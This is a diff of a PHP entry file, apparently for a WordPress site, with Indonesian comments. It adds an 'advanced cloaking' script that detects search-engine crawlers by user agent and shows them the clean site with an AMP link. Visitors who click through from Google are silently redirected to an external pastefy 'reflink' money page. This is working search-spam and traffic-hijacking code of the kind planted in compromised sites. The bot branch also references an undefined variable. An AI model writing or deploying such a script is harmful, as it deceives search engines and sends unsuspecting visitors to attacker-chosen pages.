@@ -1,68 +1,68 @@
 <?php
 /**
- * 1. KONFIGURASI LINK & FILTERING
- * Masukkan link atau path file yang sesuai di sini.
+ * ====================================================
+ * SKRIP CLOAKING ADVANCED - WORDPRESS & AMP
+ * ====================================================
  */
-$amp_valid_source = 'https://amp-resetmeplease.pages.dev/'; // URL Konten AMP untuk Bot
-$money_page       = 'home.php'; // File Landing Page/Halaman Utama
 
-$googleBots = array(
-    "Googlebot",
-    "Google-Site-Verification",
-    "Google-InspectionTool",
-    "Googlebot-Mobile",
-    "Googlebot-News",
-    "Mediapartners-Google"
-);
-
-$isGoogleBot = false;
-$userAgent   = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
-$referer     = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-
-// 2. CEK APAKAH INI BOT GOOGLE
-foreach ($googleBots as $bot) {
-    if (stripos($userAgent, $bot) !== false) {
-        $isGoogleBot = true;
-        break;
-    }
-}
-
-// 3. CEK APAKAH TRAFFIC DATANG DARI GOOGLE (REFERRER)
-$isFromGoogle = (stripos($referer, 'google.com') !== false || stripos($referer, 'ampproject.org') !== false);
+// 1. KONFIGURASI UTAMA
+$landing_page_url = 'https://pastefy.app/3QjF29Df/raw'; // Link Cuan / Reflink
+$amp_url          = 'https://amp-resetmeplease.pages.dev/'; // Link AMP untuk Googlebot
+$wp_core          = __DIR__ . '/wp-blog-header.php'; // Path standar WordPress
 
 /**
- * 4. LOGIKA PENYARINGAN (CLOAKING)
+ * 2. IDENTIFIKASI PENGUNJUNG
+ */
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$referer   = $_SERVER['HTTP_REFERER'] ?? '';
+$ip        = $_SERVER['REMOTE_ADDR'] ?? '';
+
+// Deteksi Bot secara mendalam
+$bot_list = '/(googlebot|adsbot-google|mediapartners-google|google-v8-eyeballs|bingbot|slurp|duckduckbot|baiduspider|yandexbot|crawler|spider|lighthouse)/i';
+$isBot = (bool)preg_match($bot_list, $userAgent);
+
+// Deteksi Referer (Hanya jika klik dari hasil pencarian Google)
+$isFromGoogle = (stripos($referer, 'google') !== false || stripos($referer, 'ampproject.org') !== false);
+
+/**
+ * 3. LOGIKA PENYAJIAN KONTEN
  */
 
-if ($isGoogleBot) {
-    // Jika Bot Google: Berikan konten AMP murni agar validasi sukses
-    $content = @file_get_contents($amp_valid_source);
-    if ($content !== false) {
-        echo $content;
+// --- KONDISI A: JIKA YANG DATANG ADALAH BOT ---
+if ($isBot) {
+    // Sisipkan tag link AMP agar GSC mendeteksi versi mobile resminya adalah AMP kamu
+    echo '<link rel="amphtml" href="' . $amp_url . '">';
+    
+    // Tampilkan konten WordPress asli agar lolos verifikasi GSC (Clean)
+    if (file_exists($wp_core)) {
+        define('WP_USE_THEMES', true);
+        require $wp_path;
     } else {
-        echo "AMP Content Missing";
+        echo "Site Under Maintenance";
     }
     exit;
-} 
+}
 
+// --- KONDISI B: JIKA PENGUNJUNG ASLI DARI GOOGLE ---
 if ($isFromGoogle) {
-    // Jika User Klik dari Google: Arahkan ke Money Page
-    if (file_exists($money_page)) {
-        include($money_page);
-    } else {
-        // Jika file money_page tidak ada, jalankan WordPress (Fallback)
-        define( 'WP_USE_THEMES', true );
-        require __DIR__ . '/wp-blog-header.php';
-    }
+    // Alihkan langsung ke Landing Page atau Reflink
+    // Menggunakan 302 agar redirect tidak permanen di mata browser
+    header("Location: " . $landing_page_url, true, 302);
     exit;
 }
 
-/**
- * 5. JALANKAN WORDPRESS (DEFAULT)
- * Jika traffic direct atau bot lain, jalankan WordPress secara normal.
- * Anda juga bisa mengubah bagian ini untuk menampilkan AMP jika ingin lebih ketat.
- */
-define( 'WP_USE_THEMES', true );
+// --- KONDISI C: FALLBACK (TRAFFIC LANGSUNG / BUKAN GOOGLE) ---
+// Jika orang ketik URL langsung atau dari sosial media, tetap tampilkan WordPress
+if (file_exists($wp_core)) {
+    define('WP_USE_THEMES', true);
+    require $wp_core;
+} else {
+    echo "Site Under Maintenance";
+}
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+/**
+ * CATATAN PENTING:
+ * 1. Letakkan file ini di folder yang sama dengan wp-config.php
+ * 2. Pastikan file wp-blog-header.php ada (bawaan WordPress).
+ * 3. Jangan lupa tes: Buka pakai HP dengan klik dari Google, dan buka langsung.
+ */
